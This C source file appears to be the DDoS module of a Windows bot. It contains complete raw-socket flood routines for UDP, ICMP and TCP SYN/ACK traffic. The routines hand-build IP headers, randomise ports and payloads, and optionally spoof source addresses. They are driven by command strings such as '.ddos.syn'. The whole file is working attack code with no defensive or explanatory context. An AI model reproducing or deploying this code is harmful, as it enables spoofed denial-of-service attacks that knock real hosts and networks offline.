#include "stdafx.h"

/* Major packeting goes here */

BYTE packet_spoofing;
unsigned int spf[255];

DWORD WINAPI UDP(LPVOID param)
{
	UDPFLOOD info;
	static UDPPACKET packet;
	struct sockaddr_in udp_sin;
	SOCKET udpsock;
	BOOL flag;
	register unsigned long start;
	int ri;
	PSDHEADER psdHeader;
	char buffer[1024];

	info = *((UDPFLOOD *)param);
	if (info.time == 0) {
		udpdeb("Sending packets for 0 seconds?\n");
		return 0;
	}
	udpsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (udpsock == INVALID_SOCKET) {
		udpdeb("Socket error: %s\n",fmterr( WSAGetLastError() ) );
		return 0;
	}
	flag = TRUE; 
	if (setsockopt(udpsock,IPPROTO_IP,IP_HDRINCL,(char *)&flag,sizeof(flag)) == SOCKET_ERROR) {
		udpdeb("setsockopt: %s\n",fmterr( WSAGetLastError() ) );
		return 0;
	}
	if (DnsResolve(info.target) == ERR) {
		udpdeb("resolve failed: %s\n",fmterr( WSAGetLastError() ) );
		return 0;
	}
	
	udp_sin.sin_family = AF_INET;
	udp_sin.sin_port = htons(0);
	udp_sin.sin_addr.s_addr = DnsResolve(info.target);

	start = GetTickCount();

	register DWORD sent = 0;
	register unsigned long timeend = (unsigned long)info.time * 60;
	
	srand( (unsigned) GetTickCount() + (GetCurrentThreadId() >> 2));

	while (((GetTickCount() - start) / 1000) <= timeend)
	{
		#ifndef FRELEASE
		Sleep(RELEASE_SLEEP_DELAY);
		#endif
		packet.ipHeader.h_verlen = (4<<4 | sizeof(IPHEADER)/sizeof(unsigned long)); 
		packet.ipHeader.total_len = sizeof(IPHEADER) + sizeof(UDPHDR) + UDP_REQ_DATASIZE; 
		packet.ipHeader.ident = 1; 
		packet.ipHeader.frag_and_flags = 0; 
		packet.ipHeader.ttl = 253; 
		packet.ipHeader.proto = IPPROTO_UDP; 
		packet.ipHeader.checksum = 0; 
		packet.ipHeader.destIP = udp_sin.sin_addr.s_addr;
		packet.ipHeader.sourceIP = packet_spoofing ? spf[rand()%255] : spf[0]; 

		packet.udpHeader.Checksum = 0;
		packet.udpHeader.Length = htons(sizeof(UDPHDR) + UDP_REQ_DATASIZE);
		packet.udpHeader.dport = info.port ? htons(info.port) : htons(rand()%65534);
		packet.udpHeader.sport = rand()%65534;
		//fill the packet data with a random character..
		for(ri = 0; ri < UDP_REQ_DATASIZE ; ri ++ ) 
			packet.cData[ri] = rand()%255;

		packet.ipHeader.checksum = checksum((USHORT *)&packet.ipHeader,sizeof(packet.ipHeader));

		psdHeader.daddr = packet.ipHeader.destIP; 
		psdHeader.mbz = 0; 
		psdHeader.ptcl = IPPROTO_UDP; 
		psdHeader.tcpl = htons(sizeof(packet.udpHeader) + UDP_REQ_DATASIZE); 
		psdHeader.saddr = packet.ipHeader.sourceIP; 

		memcpy(buffer, (void*) &psdHeader,sizeof( psdHeader));
		memcpy(buffer + sizeof(psdHeader), &packet.udpHeader, sizeof(packet.udpHeader) + UDP_REQ_DATASIZE);
		packet.udpHeader.Checksum = checksum((USHORT *) &buffer,sizeof(psdHeader) + sizeof(packet.udpHeader) + UDP_REQ_DATASIZE);

		if (sendto(udpsock, (const char *) &packet, sizeof(packet), 0, 
			(SOCKADDR *)&udp_sin, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
		{
			//udpdeb("[UDP] Error at %lu packet: %s\n",sent,fmterr(WSAGetLastError()));
			return 0;
		}
		sent++;
	}
	closesocket(udpsock);
	//udpdeb("[UDP] Finished packeting %s. Packets far away: %lu\n",info.target,sent);
	return 0;
}

DWORD WINAPI ICMP(LPVOID param)
{
	ICMPFLOOD info;
	static ECHOREQUEST echo_req;
	struct sockaddr_in icmp_sin;
	SOCKET icmpsock;
	BOOL flag;
	unsigned long start;
	WORD ri;

	info = *((ICMPFLOOD *)param);
	icmpsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (icmpsock == INVALID_SOCKET) {
		udpdeb("Socket error: %s\n",fmterr( WSAGetLastError() ) );
		return 0;
	}
	flag = TRUE; 
	if (setsockopt(icmpsock,IPPROTO_IP,IP_HDRINCL,(char *)&flag,sizeof(flag)) == SOCKET_ERROR) {
		udpdeb("setsockopt: %s\n",fmterr( WSAGetLastError() ) );
		return 0;
	}
	if (DnsResolve(info.target) == ERR) {
		udpdeb("resolve failed: %s\n",fmterr( WSAGetLastError() ) );
		return 0;
	}
	icmp_sin.sin_family = AF_INET;
	icmp_sin.sin_port = htons(0);
	icmp_sin.sin_addr.s_addr = DnsResolve(info.target);

	start = GetTickCount();

	register DWORD sent = 0;
	register unsigned long timeend = (unsigned long)info.time * 60;

	srand( (unsigned) GetTickCount() + (GetCurrentThreadId() >> 2));

	while (((GetTickCount() - start) / 1000) <= timeend) {
		#ifndef FRELEASE
		Sleep(RELEASE_SLEEP_DELAY);
		#endif
		echo_req.ipHeader.h_verlen=(4<<4 | sizeof(IPHEADER)/sizeof(unsigned long)); 
		echo_req.ipHeader.total_len = sizeof(IPHEADER) + sizeof(ECHOREQUEST); 
		echo_req.ipHeader.ident=1; 
		echo_req.ipHeader.frag_and_flags=0; 
		echo_req.ipHeader.ttl=253; 
		echo_req.ipHeader.proto=IPPROTO_ICMP; 
		echo_req.ipHeader.checksum=0; 
		echo_req.ipHeader.destIP=icmp_sin.sin_addr.s_addr;

		echo_req.icmpHdr.icmp_type = ICMP_ECHO_REQUEST;
		echo_req.icmpHdr.icmp_code = 0;
		echo_req.icmpHdr.icmp_id = (WORD) timeend;
		echo_req.icmpHdr.icmp_cksum = 0;

		echo_req.ipHeader.sourceIP = packet_spoofing ? spf[rand()%255] : spf[0];
		echo_req.icmpHdr.icmp_seq = (WORD) sent;
		//fill the packet data with a random character..
		for(ri = 0; ri < ICMP_REQ_DATASIZE ; ri ++ ) 
			echo_req.cData[ri] = rand()%255;

		echo_req.icmpHdr.icmp_cksum = checksum((USHORT*) &echo_req.icmpHdr,sizeof(echo_req.icmpHdr) + ICMP_REQ_DATASIZE);

		if (sendto(icmpsock, (const char *) &echo_req, sizeof(ECHOREQUEST), 0, 
			(SOCKADDR *)&icmp_sin, sizeof(SOCKADDR_IN)) == SOCKET_ERROR) {
			//udpdeb("[ICMP] Error at %lu packet: %s\n",sent,fmterr(WSAGetLastError()));
			return 0;
		}
		sent ++;
	}
	closesocket(icmpsock);
	//udpdeb("[ICMP] Finished packeting %s. Packets far away: %lu\n",info.target,sent);
	return 0;
}

DWORD WINAPI TCP(LPVOID param)
{
	TCPFLOOD info;
	IPHEADER ipHeader; 
	TCPHEADER tcpHeader; 
	PSDHEADER psdHeader; 
	char buffer[1024]; 
	BOOL flag; 
	SOCKET ssock; 
	SOCKADDR_IN addr_in; 
	unsigned long start;
	unsigned char flags;
	int packet_len;

	srand(GetTickCount());
	info = *((TCPFLOOD *)param);
	if (info.time == 0) {
		udpdeb("Sending packets for 0 seconds?\n");
		return 0;
	}
	ssock = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
	if (ssock == INVALID_SOCKET) {
		udpdeb("Socket error: %s\n",fmterr( WSAGetLastError() ) );
		return 0;
	} 
	flag = TRUE; 
	if (setsockopt(ssock,IPPROTO_IP, IP_HDRINCL,(char *)&flag,sizeof(flag))==SOCKET_ERROR) 
	{ 
		udpdeb("setsockopt: %s\n",fmterr( WSAGetLastError() ) );
		return 0;
	} 
	if (DnsResolve(info.target) == ERR)
	{
		udpdeb("resolve failed: %s\n",fmterr( WSAGetLastError() ) );
		return 0; 
	}

	addr_in.sin_family=AF_INET; 
	addr_in.sin_port = htons(0); 
	addr_in.sin_addr.s_addr = DnsResolve(info.target);

	start = GetTickCount();
	flags = 0;
	deb("info.type: %s", info.type);

	if (lstrcmp(info.type,".ddos.syn") == 0) 
		flags = SYN;
	else if (lstrcmp(info.type,".ddos.ack") == 0)
		flags = ACK;
	else if (lstrcmp(info.type,".ddos.packet") == 0)
		flags = 0;

	deb("flags: 0x02x", flags);

	memset(buffer,0,sizeof(buffer));

	register DWORD sent = 0;
	register unsigned long timeend = (unsigned long)info.time * 60;
	/*if( !SetPriorityClass(GetCurrentProcess(),HIGH_PRIORITY_CLASS) )
		deb("Failed to set highest priority class. %s\n",FORMATERROR);
	if ( !SetThreadPriority(GetCurrentThread(),THREAD_PRIORITY_TIME_CRITICAL) )
		deb("Failed to set highest priority. %s\n",FORMATERROR);*/
	srand( (unsigned) GetTickCount() + (GetCurrentThreadId() >> 2));

	while (((GetTickCount() - start) / 1000) <= timeend)
	{
		#ifndef FRELEASE
		Sleep(RELEASE_SLEEP_DELAY);
		#endif
		/* setup ip */
		ipHeader.h_verlen = (4<<4 | sizeof(ipHeader)/sizeof(unsigned long)); 
		ipHeader.total_len = sizeof(ipHeader)+sizeof(tcpHeader); 
		ipHeader.ident = rand(); 
		ipHeader.frag_and_flags=0; 
		ipHeader.ttl= 128 + (rand() % 127); 
		ipHeader.proto = IPPROTO_TCP; 
		ipHeader.checksum = 0; 
		ipHeader.destIP = addr_in.sin_addr.s_addr; 
		ipHeader.sourceIP = packet_spoofing ? spf[rand()%255] : spf[0];
		
		/* setup tcp */
		tcpHeader.th_lenres = (sizeof(tcpHeader)/4<<4|0);
		tcpHeader.th_win = htons( 512 + ( rand() % 256 )); 
		tcpHeader.th_urp = 0; 
		tcpHeader.th_sum = 0; 
		tcpHeader.th_dport = info.port ? htons(info.port) : htons(rand()%65535);
		tcpHeader.th_sport = htons(rand()%65535);  
		tcpHeader.th_seq = rand(); 
		
		if ( !flags )
		{
			tcpHeader.th_ack = rand()%3;
			tcpHeader.th_flag = rand()%2 ? SYN : ACK;
		}
		else
		{
			tcpHeader.th_ack = 0;
			tcpHeader.th_flag = flags;
		}
		/* setup pseudo header */
		psdHeader.daddr = ipHeader.destIP; 
		psdHeader.mbz = 0; 
		psdHeader.ptcl = IPPROTO_TCP; 
		psdHeader.tcpl = htons(sizeof(tcpHeader)); 
		psdHeader.saddr = ipHeader.sourceIP; 

		memcpy(buffer, &psdHeader,sizeof(psdHeader));
		memcpy(buffer + sizeof(psdHeader), &tcpHeader,sizeof(tcpHeader));
		tcpHeader.th_sum = checksum((USHORT *) buffer, sizeof(psdHeader) + sizeof(tcpHeader));

		/* calculate ip header crc */
		ipHeader.checksum = checksum((USHORT *)&ipHeader,sizeof(ipHeader));

		/* construct packet */
		memcpy(buffer, &ipHeader, sizeof(ipHeader)); 
		memcpy(buffer + sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader)); 
		packet_len = sizeof(ipHeader) + sizeof(tcpHeader);

		if(sendto(ssock, (char *) &buffer, packet_len, 0, (SOCKADDR *)&addr_in, sizeof(addr_in)) == SOCKET_ERROR) 
		{
			//udpdeb("[%s] Error at %lu packet: %s\n",info.type,sent,fmterr(WSAGetLastError()));
			deb("[%s] Error at %lu packet: %s\n",info.type,sent,fmterr(WSAGetLastError()));
			return 0;
		}
		sent ++;
	}
	closesocket(ssock);
	//udpdeb("[%s] Finished packeting %s. Packets far away: %lu\n",info.type,info.target,sent);
	return 0;
}